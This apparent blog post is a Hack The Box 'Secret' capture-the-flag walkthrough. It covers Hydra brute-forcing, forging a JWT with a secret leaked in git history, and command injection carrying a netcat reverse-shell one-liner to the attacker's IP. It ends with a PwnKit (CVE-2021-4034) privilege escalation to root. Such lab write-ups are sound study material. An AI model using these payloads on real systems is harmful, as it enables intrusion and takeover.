---
title: Secret
layout: base.njk
description: >
  A short description of page
tags:
  - post
  - hackTheBoxPost
---

# Introduction
This is a box that makes you learn a bit of json, git and make. Three things I didn't know beforehand, so it's a great opportunity to learn!

# Enumeration
As always we start with a nmap scan.
```bash
┌──(kali㉿kali)-[~/Documents/HTB/secret]
└─$ nmap -sC -sV 10.10.11.120
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 13:46 EST
Nmap scan report for secret.htb (10.10.11.120)
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.01 seconds
```
As you see here, there are three ports, 22, 80 and 3000. I'm guessing 22 is for ssh management by the creator, and 80 is our possible main attack vector. But port 3000 is open and is running a Node.js service. I'm not great at node so this looks interesting. The service DUMB Docs is also something I have never heard of.
A quick google search doesn't really yeild any results surrounding what the Dumb Docs are. Anyway, lets check out this website. I will also start dirbscan of the webpage at the same time. I'ts always a good idea to have a automatic scan running while I'm manually checking out something.

![DumbDocs](https://i.imgur.com/SV8eO7m.png)

The website is offering a guide on how to register users and what the different responses are. As you see in the picture, it mentions port 3000. This is really interesting. Therefore i direct my dirbscan towards the 3000 port to see if there is anything extra there.
While it's scanning I'll check out the guide. It seems like if you want to register a user you use the following
```json
POST http://localhost:3000/api/user/register 
 {
	"name": "dasith",
	"email": "root@dasith.works",
	"password": "Kekc8swFgD6zU"
  }
```
And the response would be:
```json
  {
	"user": "dasith",
  }
```

While a login would look like:
```json
POST http://localhost:3000/api/user/login 
 {
	"email": "root@dasith.works",
	"password": "Kekc8swFgD6zU"
  }
   
```
And would then return a auth-token.
```json
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg 
```
If we pass that auth token to a [JWT decoder](https://jwt.io/), we would get the decoded values:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "_id": "6205894901291c0464dfdf16",
  "name": "theadmin",
  "email": "root@dasith.works",
  "iat": 1644530070
}
HMACSHA256(
    base64UrlEncode(header).base64UrlEncode(payload),secret
)
```
And finally we could access the private route through the following request:
```json
GET http://localhost:3000/api/priv 
auth-token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg
content-type: application.json

{
    "key":"secretpassword"
}
```
The reply is what kind of user we are, there are only two types: normal user and administrator.
So according to the docs, if we follow this process we could register a user, authenticate it, get a authentication token and then check our privileges. If we are the admin we would get a reply that tells us our role. With that in mind we should try to get a authentication token to see if we can do any sql injects or try to register a user as admin or try the credentials in the docs.

# Rabbit hole
So with the general flow of the program in mind, we see that the user dasith is used in the example. If we try to register a user called dasith, we get a notification that that user excist. Therefore we could fire up hydra to do some bruteforcing to try to obtain his password.
Hydra is extreamly picky on the syntax, and now we are trying to bruteforce through a json application. Therefore a syntax like this would suffice to find the password:
` hydra -l root@dasith.works -P /usr/share/wordlists/rockyou.txt "http-post-form://10.10.11.120/api/user/login:{\"email\"\: \"root@dasith.works\",\"password\"\: \"^PASS^\"}:F=Password is|must be at least:H=Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Connection: close:H=Content-Type: application/json" -s 3000`
The interaction would simply look like this:
```http
POST /api/user/login HTTP/1.0
Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language:  en-US,en;q=0.5
Accept-Encoding:  gzip, deflate
Connection:  close
Content-Type:  application/json
Host: 10.10.11.120:3000
User-Agent: Mozilla/5.0 (Hydra)
Content-Length: 52
Cookie: 

{"email": "root@dasith.works","password": "shannon"}HTTP/1.1 400 Bad Request
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 17
ETag: W/"11-LBb+xM08Oz0tnf3F9safmaM6bN4"
Date: Thu, 24 Feb 2022 21:29:58 GMT
Connection: close

Password is wrong
```
This is the password the dasith user:
```bash
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-24 16:29:27
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.11.120:3000/api/user/login:{"email"\: "root@dasith.works","password"\: "^PASS^"}:F=Password is|must be at least:H=Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Connection: close:H=Content-Type: application/json
[3000][http-post-form] host: 10.10.11.120   login: root@dasith.works   password: mypassword
1 of 1 target successfully completed, 1 valid password found
```
But upon getting his auth-token and logging in to the /priv path, we get a message telling us that we are a normal user. So this doesn't help us.

# Further enumeration
So after chasing a dead end, i check what dirb found. It found a page called download. It doesn't really give us anything. Therefore I will further fuzz the area to see if I can find a file here.
```bash
---- Scanning URL: http://10.10.11.120:3000/ ----
+ http://10.10.11.120:3000/api (CODE:200|SIZE:93)                                           
+ http://10.10.11.120:3000/assets (CODE:301|SIZE:179)
+ http://10.10.11.120:3000/docs (CODE:200|SIZE:20720)
+ http://10.10.11.120:3000/download (CODE:301|SIZE:183)
```

 10.10.11.120:3000/files.zip
XXXXX seems to have found a .zip file. So lets download and check it out. A good idea is to make a folder that you extract everything to, if not the zip file might not have a parent folder and will just dump everything there.
After unszipping it we find the following:
```bash
┌──(kali㉿kali)-[~/Documents/HTB/secret/local-web]
└─$ ls -la        
total 116
drwxrwxr-x   8 kali kali  4096 Feb 16 15:51 .
drwxr-xr-x   3 kali kali  4096 Feb 23 17:16 ..
-rw-rw-r--   1 kali kali    72 Sep  3 01:59 .env
drwxrwxr-x   8 kali kali  4096 Feb 13 06:01 .git
-rw-rw-r--   1 kali kali   885 Sep  3 01:56 index.js
drwxrwxr-x   2 kali kali  4096 Feb 13 06:25 model
drwxrwxr-x 201 kali kali  4096 Aug 13  2021 node_modules
-rw-rw-r--   1 kali kali   491 Aug 13  2021 package.json
-rw-rw-r--   1 kali kali 69452 Aug 13  2021 package-lock.json
drwxrwxr-x   4 kali kali  4096 Sep  3 01:54 public
drwxrwxr-x   2 kali kali  4096 Feb 13 06:26 routes
drwxrwxr-x   4 kali kali  4096 Aug 13  2021 src
-rw-rw-r--   1 kali kali   651 Aug 13  2021 validations.js
```
So there are two hidden folders and multiple others that we should check out. After some manual emueration we find out that the `routes` folder is the node.js pages we are accessing. Futher we see in the `.env` folder that we get key that could of have been used to encode the JWT keys. The theory is that if we obtain the key, that we can create our own JWT key and obtain the admin role. 
An interesting thing is that the routes folder has the files private.js, and in this file we have the following code:

```js
const router = require('express').Router();
const verifytoken = require('./verifytoken')
const User = require('../model/user');

router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```
The check litterly doesn't care if we have the correct password or anything like that. As long as we have a valid JWT and a username=theadmin, we are automaticly admin. Therefore we just need to create a JWT token that gives us the name "theadmin".

# Checking the .git history
So, there was a .git folder, and it seems like this was a program that was downloaded from github. Googling it doesn't yield any results, but if you use the command `git show`, you can see the different versions of the git repository you have cloned. So lets look there.
```bash
0000000000000000000000000000000000000000 55fe756a29268f9b4e786ae468952ca4a8df1bd8 dasithsv <dasithsv@gmail.com> 1630648552 +0530        commit (initial): first commit
55fe756a29268f9b4e786ae468952ca4a8df1bd8 3a367e735ee76569664bf7754eaaade7c735d702 dasithsv <dasithsv@gmail.com> 1630648599 +0530        commit: added downloads
3a367e735ee76569664bf7754eaaade7c735d702 4e5547295cfe456d8ca7005cb823e1101fd1f9cb dasithsv <dasithsv@gmail.com> 1630648655 +0530        commit: removed swap
4e5547295cfe456d8ca7005cb823e1101fd1f9cb de0a46b5107a2f4d26e348303e76d85ae4870934 dasithsv <dasithsv@gmail.com> 1630648759 +0530        commit: added /downloads
de0a46b5107a2f4d26e348303e76d85ae4870934 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 dasithsv <dasithsv@gmail.com> 1630648817 +0530        commit: removed .env for security reasons
67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 e297a2797a5f62b6011654cf6fb6ccb6712d2d5b dasithsv <dasithsv@gmail.com> 1631126007 +0530        commit: now we can view logs from server 😃
```
Immedietly the version 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 looks interesting becuase it removed .ev for security reasons. If you remember, thats where we found the "secret" token password. So by viewing this we could see whats the security risk.

```bash
┌──(kali㉿kali)-[~/Documents/HTB/secret/local-web]
└─$ git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret

```
We have the secret token!
Now we can craft our JWT and get a token where our name is theadmin.
# Exploit
So head over to the JWT online decoder and craft the token. The values I'm choosing are:
```json
{
  "_id": "6205894901291c0464dfdf16",
  "name": "theadmin",
  "email": "TGC@nowhere.com",
  "iat": 1644530070
}
```
As we know, nothing else but the key and name really matters.
Therefore by using this token at /auth/priv we get the following:
```html
GET /api/priv/ HTTP/1.1
Host: 10.10.11.120:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type:application/json
Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjA1ODk0OTAxMjkxYzA0NjRkZmRmMTYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IlRHQ0Bub3doZXJlLmNvbSIsImlhdCI6MTY0NDUzMDA3MH0.9mP1WrnMqAlNANivAR19Cn6vNTaPF_MBgTvOSYd9zow
Content-Length: 6

{
    "key":"doesntmatter"
}

-------------
RESPONSE
------------

	{
		"role": {
			"role": "you are admin",
			"desc": "this is only for admin"
		}
	}

```
Great we are now admin. Now lets see what we can do with this. If we go back the the `local_web/routes/private.js` we see that it's possible to view logs there. The check looks like the following:
INSERT CODE FROM LOGS BIT
We see that if our token says admin, we can get logs by the service trying to run `git logs $file`. Now there is two logical places that it will recive the command. In the json content of the GET request, or in the url. So lets craft a request and see which hit we get.

```html
GET /api/logs/?file=0;whoami HTTP/1.1
Host: 10.10.11.120:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type:application/json
Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjA1ODk0OTAxMjkxYzA0NjRkZmRmMTYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IlRHQ0Bub3doZXJlLmNvbSIsImlhdCI6MTY0NDUzMDA3MH0.9mP1WrnMqAlNANivAR19Cn6vNTaPF_MBgTvOSYd9zow
Content-Length: 6

{
	"file"="0; pwd"
}
```
The respons I got was `\ndasith`. This means that it got a hit at the URL. So it gets the command there. Head over to [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and find a reverseshell oneliner that suites you.
I was only able to get: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` to work so I will be showcasing this.
Start a reverse tcp listener `nc -nvlp 8080`
```html
GET /api/logs/?file=0;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.231 8080 >/tmp/f HTTP/1.1
Host: 10.10.11.120:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type:application/json
Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjA1ODk0OTAxMjkxYzA0NjRkZmRmMTYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IlRHQ0Bub3doZXJlLmNvbSIsImlhdCI6MTY0NDUzMDA3MH0.9mP1WrnMqAlNANivAR19Cn6vNTaPF_MBgTvOSYd9zow
Content-Length: 6

{

}
```
And we get shell!

# Privesc
So first i go to /dev/shm to get a clean slate that I can work from and not disturb anyone else. There i transfer [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) through the http server built into python. `python -m http.server`. And get my shell to get this with curl `curl http://10.10.14.231:8000/linpeas.sh -o linpeas.sh`.
And run the script
```bash
╔══════════╣ Operative system                                                                                                                                                         
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 5.4.0-89-generic (buildd@lgw01-amd64-044) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.3 LTS
Release:        20.04      
Codename:       focal     
                         
╔══════════╣ Sudo version  
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
Sudo version 1.8.31
Vulnerable to CVE-2021-4034
./linpeas.sh: 1188: [[: not found
./linpeas.sh: 1188: rpm: not found
./linpeas.sh: 1188: 0: not found                                                                                                                                                                                  
╔══════════╣ PATH          
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
/usr/bin:/bin            
New path exported: /usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin 

```
So linpeas reports that the host is vulnerable to [cve 2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034), first lets check it out to see what it is. It's a vulneralbility that has a local privilege escalation fault in the polkit pkexec utility. Therefore we can elevate ourselfs to root through the pkexec utility. It has to do with a setuid bit that is wrongly set.
Here are two expliots that could work, i chose the latter as it seems like less work.

https://github.com/berdav/CVE-2021-4034

https://www.exploit-db.com/exploits/50689

I prepare the files for transfer and transfer them with the python http server. Once the files are transferred, you simply have to run make and it will build the files for you and create a exploit program that will run the exploit. If you're wondering what make does its explained in further detail [here](https://www.tutorialspoint.com/unix_commands/make.htm). But simply put, it's a program that compiles bigger programs. It takes a makefile and compiles the different elements as they should be done. So therefore it's easy to write something in C and compile it with ease.
# Root
```bash
### On the host we are attacking
$ curl http://10.10.14.231:8000/Makefile -o Makefile
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   172  100   172    0     0    873      0 --:--:-- --:--:-- --:--:--   868
$ curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   172  100   172    0     0    873      0 --:--:-- --:--:-- --:--:--   868
$ curl http://10.10.14.231:8000/exploit.c -o exploit.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   555  100   555    0     0   2720      0 --:--:-- --:--:-- --:--:--  2733
$ make
gcc -shared -o evil.so -fPIC evil-so.c
evil-so.c: In function ‘gconv_init’:
evil-so.c:10:2: warning: implicit declaration of function ‘setgroups’; did you mean ‘getgroups’? [-Wimplicit-function-declaration]
   10 |  setgroups(0);
      |  ^~~~~~~~~
      |  getgroups
evil-so.c:12:2: warning: null argument where non-null required (argument 2) [-Wnonnull]
   12 |  execve("/bin/sh", NULL, NULL);
      |  ^~~~~~
gcc exploit.c -o exploit
exploit.c: In function ‘main’:
exploit.c:26:2: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
   26 |  execve(BIN, argv, envp);
      |  ^~~~~~
      
### The files are made, now just run ./exploit
$ ls
asdf
evil.so
evil-so.c
exploit
exploit.c
linpeas.sh
makefile
multipath
rash

$ ./exploit
whoami
root
pwd
/dev/shm
cd /root
ls
root.txt
```
We are root
